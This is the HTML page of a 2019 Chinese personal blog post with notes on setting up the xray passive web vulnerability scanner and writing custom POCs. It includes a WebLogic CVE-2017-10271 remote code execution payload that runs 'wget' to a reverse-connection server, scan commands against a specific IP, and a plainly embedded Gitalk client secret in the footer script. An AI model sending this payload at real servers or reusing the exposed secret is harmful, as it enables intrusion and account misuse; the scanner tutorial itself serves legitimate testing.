@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透,扫描器," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Mugen" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言很早之前就想搞个好用的被动扫描器，之前搭过像GourdScan，NagaScan，都感觉不是很舒服，用的不爽，今天看到长亭大牛们写的xray，感觉这东西很符合我的胃口，初步使用了一下，感觉很舒服，冲起来！ 正文项目地址：xray    https://github.com/chaitin/xray/tree/master/docs 特点：可扫描单个url、可使用基础爬虫扫描，可使用被动扫描。被">
+<meta name="keywords" content="渗透,扫描器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初试xray">
+<meta property="og:url" content="https://legoc.github.io/2019/08/14/初试xray/index.html">
+<meta property="og:site_name" content="Mugen">
+<meta property="og:description" content="前言很早之前就想搞个好用的被动扫描器，之前搭过像GourdScan，NagaScan，都感觉不是很舒服，用的不爽，今天看到长亭大牛们写的xray，感觉这东西很符合我的胃口，初步使用了一下，感觉很舒服，冲起来！ 正文项目地址：xray    https://github.com/chaitin/xray/tree/master/docs 特点：可扫描单个url、可使用基础爬虫扫描，可使用被动扫描。被">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-23T12:16:45.351Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初试xray">
+<meta name="twitter:description" content="前言很早之前就想搞个好用的被动扫描器，之前搭过像GourdScan，NagaScan，都感觉不是很舒服，用的不爽，今天看到长亭大牛们写的xray，感觉这东西很符合我的胃口，初步使用了一下，感觉很舒服，冲起来！ 正文项目地址：xray    https://github.com/chaitin/xray/tree/master/docs 特点：可扫描单个url、可使用基础爬虫扫描，可使用被动扫描。被">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://legoc.github.io/2019/08/14/初试xray/"/>
+
+
+
+
+
+  <title>初试xray | Mugen</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mugen</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">lego's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://legoc.github.io/2019/08/14/初试xray/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lego">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mugen">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">初试xray</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-14T21:33:00+08:00">
+                2019-08-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早之前就想搞个好用的被动扫描器，之前搭过像GourdScan，NagaScan，都感觉不是很舒服，用的不爽，今天看到长亭大牛们写的xray，感觉这东西很符合我的胃口，初步使用了一下，感觉很舒服，冲起来！</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>项目地址：xray    <a href="https://github.com/chaitin/xray/tree/master/docs" target="_blank" rel="noopener">https://github.com/chaitin/xray/tree/master/docs</a></p>
+<p>特点：可扫描单个url、可使用基础爬虫扫描，可使用被动扫描。被动扫描支持https。</p>
+<p>官方文档 <a href="https://chaitin.github.io/xray/" target="_blank" rel="noopener">https://chaitin.github.io/xray/</a></p>
+<p>这也太舒服了8。</p>
+<p>写些笔记来记录一下一些点。</p>
+<h3 id="设置被动扫描"><a href="#设置被动扫描" class="headerlink" title="设置被动扫描"></a>设置被动扫描</h3><p>官方文档上写到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure>
+<p>这也可以在本地代理，但是远程的ip端口是关闭的，因为这里是127.0.0.1，这个应该是常识，</p>
+<p>但是一开始我还是踩了坑，太弟弟了。</p>
+<p>设置远程代理的方式，即扫描器在我VPS上部署</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 0.0.0.0:7777 --html-output result.html</span><br></pre></td></tr></table></figure>
+<p>然后firefox上可以直接设置代理 ip : 7777</p>
+<p>快速搭起一个http服务查看报告</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 6666</span><br></pre></td></tr></table></figure>
+<h3 id="扫描https"><a href="#扫描https" class="headerlink" title="扫描https"></a>扫描https</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray genca</span><br></pre></td></tr></table></figure>
+<p>添加ca.crt证书到浏览器</p>
+<h4 id="自定义POC"><a href="#自定义POC" class="headerlink" title="自定义POC"></a>自定义POC</h4><p>在线编写环境 <a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">https://phith0n.github.io/xray-poc-generation/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --plugins phantasm --poc /home/ubuntu/tools/xray/pocs/poc-yaml-discuz-x25-path-disclosure --url http://122.152.210.119/Discuz/</span><br></pre></td></tr></table></figure>
+<p>例如一个简单的discuz物理路径泄露的poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name: poc-yaml-discuz_x25_path_disclosure</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /uc_server/control/admin/db.php</span><br><span class="line">    follow_redirects: true</span><br><span class="line">    expression: r&apos;Fatal error.* on line&apos;.bmatches(body)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --plugins phantasm --poc /home/ubuntu/tools/xray/pocs/poc-yaml-weblogic-cve-2017-10271-rce --url http://122.152.210.119:7001</span><br></pre></td></tr></table></figure>
+<h5 id="调用反向连接平台"><a href="#调用反向连接平台" class="headerlink" title="调用反向连接平台"></a>调用反向连接平台</h5><p>例如weblogic反序列化CVE-2017-10271 poc编写</p>
+<p>如果是在VPS上搭建的环境反向连接平台配置参考 <a href="https://chaitin.github.io/xray/#/guide/reverse" target="_blank" rel="noopener">https://chaitin.github.io/xray/#/guide/reverse</a>  场景2</p>
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">reverse:</span><br><span class="line">  store_events: false</span><br><span class="line">  token: &quot;&quot;</span><br><span class="line">  http:</span><br><span class="line">    enabled: true</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    listen_port: &quot;&quot;</span><br><span class="line">  dns:</span><br><span class="line">    enabled: false</span><br><span class="line">    listen_ip: 0.0.0.0</span><br><span class="line">    domain: &quot;&quot;</span><br><span class="line">  client:</span><br><span class="line">    # 上面的 port 留空代表自动选择，这里 $&#123;port&#125; 引用上面自动选择的值</span><br><span class="line">    http_base_url: &quot;http://your-reverse-server-ip:$&#123;port&#125;&quot;</span><br><span class="line">    dns_server_ip: &quot;your-reverse-server-ip&quot;</span><br><span class="line">    remote_server: false</span><br></pre></td></tr></table></figure>
+<p>headers这里可以自定义响应头</p>
+<p>poc（这个没考虑到windows下的情况）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">name: poc-yaml-weblogic-cve-2017-10271-rce</span><br><span class="line">rules:</span><br><span class="line">  - method: POST</span><br><span class="line">    path: /wls-wsat/CoordinatorPortType</span><br><span class="line">    headers:</span><br><span class="line">      Content-Type: text/xml</span><br><span class="line">    body: &gt;-</span><br><span class="line">      &lt;soapenv:Envelope</span><br><span class="line">      xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">      &lt;soapenv:Header&gt;</span><br><span class="line">      &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">      &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">      &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">      &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">      &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">      &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">      &lt;string&gt;wget &#123;&#123;reverse_url&#125;&#125;&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;/array&gt;</span><br><span class="line">      &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">      &lt;/java&gt;</span><br><span class="line">      &lt;/work:WorkContext&gt;</span><br><span class="line">      &lt;/soapenv:Header&gt;</span><br><span class="line">      &lt;soapenv:Body/&gt;</span><br><span class="line">      &lt;/soapenv:Envelope&gt;</span><br><span class="line">    follow_redirects: true</span><br><span class="line">    expression: waitReverse(5)</span><br></pre></td></tr></table></figure>
+<h4 id="联动burpsuite插件"><a href="#联动burpsuite插件" class="headerlink" title="联动burpsuite插件"></a>联动burpsuite插件</h4><p><a href="https://github.com/c0ny1/passive-scan-client" target="_blank" rel="noopener">https://github.com/c0ny1/passive-scan-client</a></p>
+<p>该插件正是为了解决该问题，将<code>正常访问网站的流量</code>与<code>提交给被动扫描器的流量</code>分开，互不影响。     </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lego
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://legoc.github.io/2019/08/14/初试xray/" title="初试xray">https://legoc.github.io/2019/08/14/初试xray/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/扫描器/" rel="tag"># 扫描器</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/27/SRC-越权挖掘思路/" rel="next" title="SRC-越权挖掘思路">
+                <i class="fa fa-chevron-left"></i> SRC-越权挖掘思路
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/13/metaspolit操作笔记/" rel="prev" title="metaspolit操作笔记">
+                metaspolit操作笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+ <div id="gitalk-container"></div>
+ 
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png"
+                alt="lego" />
+            
+              <p class="site-author-name" itemprop="name">lego</p>
+              <p class="site-description motion-element" itemprop="description">从小菜鸡往大菜鸡成长的路上...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置被动扫描"><span class="nav-number">2.1.</span> <span class="nav-text">设置被动扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描https"><span class="nav-number">2.2.</span> <span class="nav-text">扫描https</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#自定义POC"><span class="nav-number">2.2.1.</span> <span class="nav-text">自定义POC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调用反向连接平台"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">调用反向连接平台</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#联动burpsuite插件"><span class="nav-number">2.2.2.</span> <span class="nav-text">联动burpsuite插件</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lego</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '76aae4c57ee7f811d638',
+          clientSecret: 'd6d32a0bf34087bf9ee31a1a74fd5bd72cc23c92',
+          repo: 'legoc.github.io',
+          owner: 'legoc',
+          admin: ['legoc'],
+          id: decodeURI(window.location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+	   
+	   
+	   
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
